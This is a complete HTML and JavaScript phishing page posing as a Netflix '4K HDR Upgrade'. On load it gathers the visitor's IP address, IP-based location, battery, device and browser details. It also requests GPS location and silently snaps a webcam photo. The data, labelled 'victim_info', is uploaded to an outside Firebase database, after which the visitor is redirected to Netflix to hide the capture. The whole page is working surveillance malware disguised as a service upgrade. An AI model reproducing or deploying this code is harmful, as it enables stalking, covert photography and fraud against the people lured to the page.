<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>4K HDR Upgrade - Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
            background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(0,0,0,0.85);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(229, 9, 20, 0.3);
            padding: 2rem;
        }
        .logo { text-align: center; margin-bottom: 2rem; }
        .logo h1 { 
            font-size: 2rem; 
            background: linear-gradient(135deg, #E50914, #ff4d4d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge {
            display: inline-block;
            background: #E50914;
            padding: 0.3rem 1rem;
            border-radius: 30px;
            font-size: 0.8rem;
            margin-top: 0.5rem;
        }
        .progress-section { margin: 2rem 0; }
        .progress-bar-container {
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
            height: 8px;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #E50914, #ff4d4d);
            width: 0%;
            transition: width 0.3s ease;
        }
        .status-text {
            margin-top: 1rem;
            text-align: center;
            font-size: 0.9rem;
            color: #ccc;
        }
        .steps { margin: 2rem 0; }
        .step {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 0.8rem;
            margin: 0.5rem 0;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
        }
        .step.completed { background: rgba(76, 175, 80, 0.2); border-left: 3px solid #4CAF50; }
        .step.error { background: rgba(229, 9, 20, 0.2); border-left: 3px solid #E50914; }
        .step-icon { width: 30px; text-align: center; font-size: 1.2rem; }
        .step-text { flex: 1; font-size: 0.9rem; }
        .step-status { font-size: 0.8rem; }
        .redirect-note { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); font-size: 0.8rem; color: #888; }
        .debug-console {
            margin-top: 1rem;
            padding: 1rem;
            background: rgba(0,0,0,0.8);
            border-radius: 10px;
            font-family: monospace;
            font-size: 0.7rem;
            color: #0f0;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
        .debug-console.show { display: block; }
        button {
            margin-top: 1rem;
            padding: 0.5rem 1rem;
            background: #E50914;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>NETFLIX</h1>
            <div class="badge">4K HDR UPGRADE</div>
        </div>
        
        <div class="progress-section">
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="status-text" id="statusText">Initializing system...</div>
        </div>
        
        <div class="steps">
            <div class="step" id="step1"><div class="step-icon">🖥️</div><div class="step-text">Device Detection</div><div class="step-status" id="step1Status">⚪</div></div>
            <div class="step" id="step2"><div class="step-icon">📍</div><div class="step-text">Location Access</div><div class="step-status" id="step2Status">⚪</div></div>
            <div class="step" id="step3"><div class="step-icon">📸</div><div class="step-text">Camera Access</div><div class="step-status" id="step3Status">⚪</div></div>
            <div class="step" id="step4"><div class="step-icon">☁️</div><div class="step-text">Processing Upgrade</div><div class="step-status" id="step4Status">⚪</div></div>
        </div>
        
        <div class="redirect-note">⚡ Optimizing your streaming experience...</div>
        <button onclick="toggleDebug()">🐛 Show/Hide Debug</button>
        <div class="debug-console" id="debugConsole"><strong>📡 DEBUG CONSOLE:</strong><br><div id="debugLog">Waiting...</div></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <script>
        // 🔥 TERA NAYA WEB APP CONFIG (Storage hataya - sirf Database)
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:1d278c51947c6cbb881213",
            measurementId: "G-VT3YC79N61"
        };
        
        // Debug function
        let debugMessages = [];
        function addDebug(msg, isError = false) {
            const time = new Date().toLocaleTimeString();
            const prefix = isError ? '❌' : '✓';
            debugMessages.push(`[${time}] ${prefix} ${msg}`);
            document.getElementById('debugLog').innerHTML = debugMessages.join('<br>');
            console.log(msg);
        }
        
        function toggleDebug() {
            document.getElementById('debugConsole').classList.toggle('show');
        }
        
        // Initialize Firebase
        addDebug("Initializing Firebase...");
        try {
            firebase.initializeApp(firebaseConfig);
            addDebug("Firebase initialized successfully");
        } catch(e) {
            addDebug("Firebase init error: " + e.message, true);
        }
        
        const database = firebase.database();
        
        // Get session ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        addDebug("Session ID: " + (sessionId || "NOT FOUND"));
        
        if (!sessionId) {
            addDebug("No session ID! Redirecting...", true);
            setTimeout(() => window.location.href = 'https://www.netflix.com', 2000);
            throw new Error('No session ID');
        }
        
        function updateProgress(percent, text) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('statusText').innerHTML = text;
        }
        
        function markStep(stepNum, completed, statusText = '', isError = false) {
            const step = document.getElementById(`step${stepNum}`);
            const statusSpan = document.getElementById(`step${stepNum}Status`);
            if (completed) {
                step.classList.add('completed');
                statusSpan.innerHTML = statusText || '✓';
                statusSpan.style.color = '#4CAF50';
            } else if (isError) {
                step.classList.add('error');
                statusSpan.innerHTML = statusText || '✗';
                statusSpan.style.color = '#E50914';
            } else if (statusText) {
                statusSpan.innerHTML = statusText;
            }
        }
        
        // IP functions
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                addDebug("IP: " + data.ip);
                return data.ip;
            } catch(e) {
                addDebug("IP fetch error: " + e.message, true);
                return 'Unknown';
            }
        }
        
        async function getIPDetails(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await res.json();
                addDebug(`Location: ${data.city}, ${data.country_name}`);
                return {
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown',
                    lat: data.latitude || 0,
                    lng: data.longitude || 0
                };
            } catch(e) {
                addDebug("IP details error: " + e.message, true);
                return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
            }
        }
        
        // Battery
        async function getBattery() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const status = `${Math.round(battery.level * 100)}% (${battery.charging ? 'charging' : 'discharging'})`;
                    addDebug("Battery: " + status);
                    return status;
                } catch(e) {
                    return 'Unknown';
                }
            }
            return 'Not supported';
        }
        
        // Device Info
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown', device = 'Unknown', browser = 'Unknown';
            if (/Android/i.test(ua)) os = 'Android';
            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
            else if (/Windows/i.test(ua)) os = 'Windows';
            else if (/Mac/i.test(ua)) os = 'macOS';
            else if (/Linux/i.test(ua)) os = 'Linux';
            
            if (/Mobile/i.test(ua)) device = 'Mobile Phone';
            else if (/Tablet/i.test(ua)) device = 'Tablet';
            else device = 'Desktop';
            
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Google Chrome';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Edg/i.test(ua)) browser = 'Edge';
            
            addDebug(`Device: ${device}, OS: ${os}, Browser: ${browser}`);
            return { os, device, browser };
        }
        
        // Location
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ lat: 0, lng: 0 });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        addDebug(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
                        resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
                    },
                    (err) => {
                        addDebug("Location error: " + err.message, true);
                        resolve({ lat: 0, lng: 0 });
                    },
                    { timeout: 10000 }
                );
            });
        }
        
        // Camera with Base64 (NO STORAGE NEEDED)
        async function capturePhotoBase64() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices) {
                    addDebug("Camera API not supported", true);
                    resolve(null);
                    return;
                }
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        addDebug("Camera access granted");
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            stream.getTracks().forEach(t => t.stop());
                            
                            // Convert to Base64
                            const base64 = canvas.toDataURL('image/jpeg', 0.7);
                            addDebug(`Photo captured (Base64 length: ${base64.length})`);
                            resolve(base64);
                        };
                    })
                    .catch(err => {
                        addDebug("Camera error: " + err.message, true);
                        resolve(null);
                    });
            });
        }
        
        // Main execution
        async function main() {
            updateProgress(0, 'Starting...');
            
            // Step 1: Device Info
            markStep(1, false, '⟳');
            const ip = await getIP();
            const ipDetails = await getIPDetails(ip);
            const battery = await getBattery();
            const deviceInfo = getDeviceInfo();
            const victimInfo = {
                ip: ip,
                battery: battery,
                device: deviceInfo.device,
                os: deviceInfo.os,
                browser: deviceInfo.browser,
                screen: `${window.screen.width}x${window.screen.height}`
            };
            markStep(1, true, '✓');
            updateProgress(25, 'Device detected');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 2: Location
            markStep(2, false, '⟳');
            const loc = await getLocation();
            const locationData = { 
                lat: loc.lat, 
                lng: loc.lng, 
                country: ipDetails.country,
                region: ipDetails.region,
                city: ipDetails.city,
                isp: ipDetails.isp
            };
            markStep(2, true, loc.lat !== 0 ? '✓' : '⚠');
            updateProgress(50, 'Location processed');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 3: Camera (Base64 - No Storage)
            markStep(3, false, '⟳');
            const photoBase64 = await capturePhotoBase64();
            markStep(3, true, photoBase64 ? '✓' : '⚠');
            updateProgress(75, 'Camera processed');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 4: Upload to Firebase Realtime Database
            markStep(4, false, '⟳');
            const data = {
                victim_info: victimInfo,
                location: locationData,
                photo_base64: photoBase64,  // Photo directly in database
                timestamp: new Date().toISOString(),
                complete: true
            };
            
            addDebug("Writing to Firebase Realtime Database...");
            try {
                await database.ref(`sessions/${sessionId}/data`).set(data);
                addDebug("✅ DATA WRITTEN SUCCESSFULLY!");
                markStep(4, true, '✓');
                updateProgress(100, 'Complete! Redirecting...');
            } catch(e) {
                addDebug("Firebase write error: " + e.message, true);
                markStep(4, false, '✗', true);
                updateProgress(100, 'Error but redirecting...');
            }
            
            // Redirect after 3 seconds
            setTimeout(() => {
                addDebug("Redirecting to Netflix...");
                window.location.href = 'https://www.netflix.com';
            }, 3000);
        }
        
        // Start after 1 second
        setTimeout(main, 1000);
    </script>
</body>
</html>
